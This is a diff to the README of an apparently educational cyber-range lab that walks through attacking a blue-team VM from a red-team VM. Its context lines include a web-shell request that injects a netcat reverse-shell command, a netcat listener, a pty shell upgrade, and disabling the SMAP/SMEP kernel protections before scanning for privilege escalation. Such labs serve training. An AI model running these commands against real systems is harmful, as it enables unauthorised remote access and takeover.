@@ -31,7 +31,9 @@ terraform apply
 
 ```
 Do you want to continue (Y/n)?  Y
+Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase): <PASSPHRASE>
+Enter same passphrase again: <PASSPHRASE>
 ```
 
 7. Clone the meetup, cyber-range-target, and exploit-curation repos
@@ -56,7 +58,7 @@ sudo grubby --args "nosmap nosmep" --update-kernel /boot/vmlinuz-3.10.0-123.1.2.
 sudo reboot
 ```
 
-10. Now scan for exploitable vulnerabilities with `lem`
+10. Now relogin and scan for exploitable vulnerabilities with `lem`
 
 ```
 gcloud compute ssh blue-35370 --zone us-east4-a
@@ -84,13 +86,13 @@ nc -nlv 4444
 curl -X GET 'http://10.150.0.3/index.php?cmd=nc%20-nv%2010.150.0.2%204444%20-e%20/bin/bash'
 ```
 
-14. Now in the first `red-1` shell, you should have a reverse shell to `blue-35370`. Use this Python trick to get a tty and invoke bash.
+14. Now in the first `red-1` shell, you should have a connection to `blue-35370`. Use this Python trick to get a tty and invoke a Bourne shell.
 
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-15. Create a virtualenv, install lem, and look for a privilege escalation vulnerability.
+15. Inside the new shell, Create a virtualenv, install lem, and look for a privilege escalation vulnerability.
 
 ```
 cd /tmp
